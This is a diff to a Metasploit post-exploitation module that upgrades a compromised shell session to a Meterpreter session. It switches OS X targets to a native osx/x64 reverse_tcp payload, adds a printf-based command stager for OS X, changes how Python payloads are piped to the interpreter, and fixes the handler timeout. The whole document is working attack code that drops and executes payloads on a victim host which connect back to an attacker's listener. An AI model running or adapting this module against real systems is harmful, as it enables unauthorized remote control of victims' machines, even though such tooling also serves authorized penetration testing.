@@ -1,10 +1,8 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
 require 'msf/core/exploit/powershell'
 require 'msf/core/post/windows/powershell'
 
@@ -28,13 +26,13 @@ class MetasploitModule < Msf::Post
       ))
     register_options(
       [
-        OptAddress.new('LHOST',
+        OptAddressLocal.new('LHOST',
           [false, 'IP of host that will receive the connection from the payload (Will try to auto detect).', nil]),
         OptInt.new('LPORT',
           [true, 'Port for payload to connect to.', 4433]),
         OptBool.new('HANDLER',
           [ true, 'Start an exploit/multi/handler to receive the connection', true])
-      ], self.class)
+      ])
     register_advanced_options([
       OptInt.new('HANDLE_TIMEOUT',
         [true, 'How long to wait (in seconds) for the session to come back.', 30]),
@@ -46,18 +44,13 @@ class MetasploitModule < Msf::Post
         [false, 'Remote path to drop binary']),
       OptString.new('BOURNE_FILE',
         [false, 'Remote filename to use for dropped binary'])
-    ], self.class)
+    ])
     deregister_options('PERSIST', 'PSH_OLD_METHOD', 'RUN_WOW64')
   end
 
   # Run method for when run command is issued
   def run
     print_status("Upgrading session ID: #{datastore['SESSION']}")
-
-    if session.type =~ /meterpreter/
-      print_error("Shell is already Meterpreter.")
-      return nil
-    end
 
     # Try hard to find a valid LHOST value in order to
     # make running 'sessions -u' as robust as possible.
@@ -80,18 +73,20 @@ class MetasploitModule < Msf::Post
 
     # Handle platform specific variables and settings
     case session.platform
-    when /win/i
-      platform = 'win'
+    when 'windows', 'win'
+      platform = 'windows'
       payload_name = 'windows/meterpreter/reverse_tcp'
       lplat = [Msf::Platform::Windows]
       larch = [ARCH_X86]
       psh_arch = 'x86'
       vprint_status("Platform: Windows")
-    when /osx/i
-      platform = 'python'
-      payload_name = 'python/meterpreter/reverse_tcp'
+    when 'osx'
+      platform = 'osx'
+      payload_name = 'osx/x64/meterpreter/reverse_tcp'
+      lplat = [Msf::Platform::OSX]
+      larch = [ARCH_X64]
       vprint_status("Platform: OS X")
-    when /solaris/i
+    when 'solaris'
       platform = 'python'
       payload_name = 'python/meterpreter/reverse_tcp'
       vprint_status("Platform: Solaris")
@@ -106,8 +101,10 @@ class MetasploitModule < Msf::Post
         larch = [ARCH_X86]
         vprint_status("Platform: Linux")
       elsif target_info =~ /darwin/i
-        platform = 'python'
-        payload_name = 'python/meterpreter/reverse_tcp'
+        platform = 'osx'
+        payload_name = 'osx/x64/meterpreter/reverse_tcp'
+        lplat = [Msf::Platform::OSX]
+        larch = [ARCH_X64]
         vprint_status("Platform: OS X")
       elsif cmd_exec('python -V 2>&1') =~ /Python (2|3)\.(\d)/
         # Generic fallback for OSX, Solaris, Linux/ARM
@@ -139,7 +136,7 @@ class MetasploitModule < Msf::Post
     end
 
     case platform
-    when 'win'
+    when 'windows'
       if session.type == 'powershell'
         template_path = Rex::Powershell::Templates::TEMPLATE_DIR
         psh_payload = case datastore['Powershell::method']
@@ -169,16 +166,16 @@ class MetasploitModule < Msf::Post
           print_error('Powershell is not installed on the target.') if datastore['WIN_TRANSFER'] == 'POWERSHELL'
           vprint_status("Transfer method: VBS [fallback]")
           exe = Msf::Util::EXE.to_executable(framework, larch, lplat, payload_data)
-          aborted = transmit_payload(exe)
+          aborted = transmit_payload(exe, platform)
         end
       end
     when 'python'
       vprint_status("Transfer method: Python")
-      cmd_exec("python -c \"#{payload_data}\"")
+      cmd_exec("echo \"#{payload_data}\" | python")
     else
       vprint_status("Transfer method: Bourne shell [fallback]")
       exe = Msf::Util::EXE.to_executable(framework, larch, lplat, payload_data)
-      aborted = transmit_payload(exe)
+      aborted = transmit_payload(exe, platform)
     end
 
     if datastore['HANDLER']
@@ -188,7 +185,7 @@ class MetasploitModule < Msf::Post
     return nil
   end
 
-  def transmit_payload(exe)
+  def transmit_payload(exe, platform)
     #
     # Generate the stager command array
     #
@@ -200,16 +197,18 @@ class MetasploitModule < Msf::Post
       :linemax => linemax,
       #:nodelete => true # keep temp files (for debugging)
     }
-    if session.platform =~ /win/i
+    case platform
+    when 'windows'
       opts[:decoder] = File.join(Rex::Exploitation::DATA_DIR, "exploits", "cmdstager", 'vbs_b64')
       cmdstager = Rex::Exploitation::CmdStagerVBS.new(exe)
+    when 'osx'
+      opts[:background] = true
+      cmdstager = Rex::Exploitation::CmdStagerPrintf.new(exe)
     else
       opts[:background] = true
       opts[:temp] = datastore['BOURNE_PATH']
       opts[:file] = datastore['BOURNE_FILE']
       cmdstager = Rex::Exploitation::CmdStagerBourne.new(exe)
-      # Note: if a OS X binary payload is added in the future, use CmdStagerPrintf
-      #       as /bin/sh on OS X doesn't support the -n option on echo
     end
 
     cmds = cmdstager.generate(opts)
@@ -266,8 +265,9 @@ class MetasploitModule < Msf::Post
     framework.threads.spawn('ShellToMeterpreterUpgradeCleanup', false) {
       if !aborted
         timer = 0
-        vprint_status("Waiting up to #{HANDLE_TIMEOUT} seconds for the session to come back")
-        while !framework.jobs[listener_job_id].nil? && timer < HANDLE_TIMEOUT
+        timeout = datastore['HANDLE_TIMEOUT']
+        vprint_status("Waiting up to #{timeout} seconds for the session to come back")
+        while !framework.jobs[listener_job_id].nil? && timer < timeout
           sleep(1)
           timer += 1
         end
